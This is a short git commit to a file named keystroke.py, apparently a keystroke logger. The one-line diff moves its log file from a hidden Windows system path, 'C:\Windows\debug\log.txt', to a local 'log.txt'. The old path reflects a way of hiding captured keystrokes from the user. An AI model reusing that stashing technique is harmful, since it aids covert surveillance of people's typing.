6c366a14c122533fab7532f409e98bf517ff9757
ysfcndgr <32979760+ysfcndgr@users.noreply.github.com>
2019-10-14 00:06:59 +0300

    Update keystroke.py

--- keystroke.py
+++ keystroke.py
@@ -132,7 +132,7 @@ def main():
 
         #username = os.getlogin()
 
-        with open("C:\\Windows\\debug\\log.txt","a",encoding = "utf-8") as file:
+        with open("log.txt","a",encoding = "utf-8") as file:
 
             for x in liste:
 
